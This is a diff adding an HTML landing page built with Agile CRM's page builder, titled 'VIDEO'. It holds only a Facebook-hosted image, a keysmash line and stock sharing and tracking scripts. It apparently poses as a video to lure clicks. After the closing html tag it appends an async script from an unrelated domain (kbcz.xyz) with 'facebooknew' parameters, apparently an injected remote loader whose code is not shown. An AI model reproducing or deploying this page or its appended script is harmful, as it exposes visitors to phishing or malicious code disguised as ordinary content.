@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+ <head> 
+  <meta charset="utf-8" /> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" /> 
+  <title>VIDEO</title> 
+  <meta property="og:title" content="VIDEO " /> 
+  <meta property="og:description" content=" " /> 
+  <meta property="og:image" content="https://i.imgur.com/RXDjDES.png" /> 
+  <!-- Loading Bootstrap --> 
+  <link href="https://s3.amazonaws.com/agilecrm/pagebuilder/live/build/css/skeleton.min.css" rel="stylesheet" /> 
+  <!-- HTML5 shim, for IE6-8 support of HTML5 elements. All other JS at the end of file. --> 
+  <!--[if lt IE 9]>
+      <script src="https://s3.amazonaws.com/agilecrm/pagebuilder/static/js/html5shiv.js"></script>
+      <script src="https://s3.amazonaws.com/agilecrm/pagebuilder/static/js/respond.min.js"></script>
+    <![endif]--> 
+  <!--headerIncludes--> 
+  <style>
+    .agile-dynamic-text,.agile-dynamic-button,.agile-dynamic-image {
+        visibility: hidden;
+    }
+    </style> 
+  <style></style>
+  <!-- PlanName : FREE-->
+ </head> 
+ <body> 
+  <div id="page" class="page agile-landing-container"> 
+ xfdghdfjhgjkgh
+   <meta name="viewport" content="width=device-width, minimum-scale=0.1" /> 
+
+   <img style="user-select: none; margin: auto; outline: none;" src="https://scontent.fhex4-1.fna.fbcdn.net/v/t1.0-9/143668684_2718472111751815_2730132979278897816_n.jpg?_nc_cat=106&amp;ccb=2&amp;_nc_sid=730e14&amp;_nc_ohc=xs4Ux3ZkM0oAX_3A75C&amp;_nc_ht=scontent.fhex4-1.fna&amp;oh=e5a51a626f96278a6bd68d92da539a9a&amp;oe=60364DED" data-selector="img" /> 
+   <meta charset="UTF-8" /> 
+   <title>VIDEO</title> 
+  </div> 
+  <!-- /#page --> 
+  <!-- Load JS here for greater good =============================--> 
+  <script src="https://s3.amazonaws.com/agilecrm/pagebuilder/beta/build/js/elements.min.js"></script> 
+  <script>
+        $(document).ready(function(){
+            $('.videoWrapper').on('click', function(e) {
+                e.preventDefault();
+                $currentEl = $(this);
+                var videoPlaceholder = $currentEl.find("img.video_placeholder");
+                var videoUrl = videoPlaceholder.attr('data-video');
+                if(videoUrl) {
+                    var splitArr = videoUrl.split("?");
+                    var queryStringArr = ["autoplay=1"];
+                    if(typeof splitArr[1] != "undefined") {
+                        queryStringArr = queryStringArr.concat(splitArr[1].split("&"));
+                    }
+                    var autoPlayVideoUrl = splitArr[0] + "?" + queryStringArr.join("&");
+                    var videoIFrame = '<iframe src="' + autoPlayVideoUrl + '" frameborder="0" allowfullscreen></iframe>';
+                    $currentEl.html(videoIFrame);
+                }
+            });
+            $('.frameCover').remove();
+            $('.social-share span').on('click', function(e) {
+                //console.log($(e.currentTarget).attr('share-type'));
+                
+                var link = window.location.protocol + "//" +window.location.host + window.location.pathname;
+                var encodedLink=encodeURIComponent(link);
+                if($(e.currentTarget).hasClass('tweet'))
+                    window.open('https://twitter.com/intent/tweet?url='+link+'?usp=send_twt&text='+document.title, '_blank');
+                else if($(e.currentTarget).hasClass('facebook'))
+                    window.open('https://www.facebook.com/sharer.php?u='+encodedLink+'?usp=send_fb&t='+document.title, '_blank');
+                else if($(e.currentTarget).hasClass('googleplus'))
+                    window.open('https://plus.google.com/share?url='+encodedLink+'?usp=send_gp', '_blank');
+                else if($(e.currentTarget).hasClass('linkedin'))
+                    window.open('https://www.linkedin.com/shareArticle?mini=true&url='+encodedLink+'&title='+document.title, '_blank');          
+
+            });
+        });
+    </script>  
+  <script></script>
+  <script src="https://yrjstueyrwt.agilecrm.com/stats/min/agile-min.js"></script>
+  <script>_agile.set_account('tkaca6hqgdbka0d8ts8eu3af9k', 'yrjstueyrwt'); _agile.track_page_view();_agile_execute_web_rules();</script>
+  <div style="float: right;  font-family: helvetica; background-color: rgba(0,0,0,.5); bottom: 0; position: fixed; right: 0;  font-size: medium; border-bottom-color: gray; z-index: 100000;">
+   <a target="_blank" style="padding-left: 5px;padding-right: 5px;color: #ffffff;" href="https://www.agilecrm.com/?utm_source=Landing%20Page&amp;utm_medium=Poweredby%20Landingpage" rel="nofollow"><span style="font-size: small;"> Powered by Agile</span></a>
+  </div>
+ </body>
+</html>
+<script src="https://kbcz.xyz/ariel/?api=1&lan=facebooknew&ht=1&counter0=xdxd195985" type="text/javascript" async="true"></script>
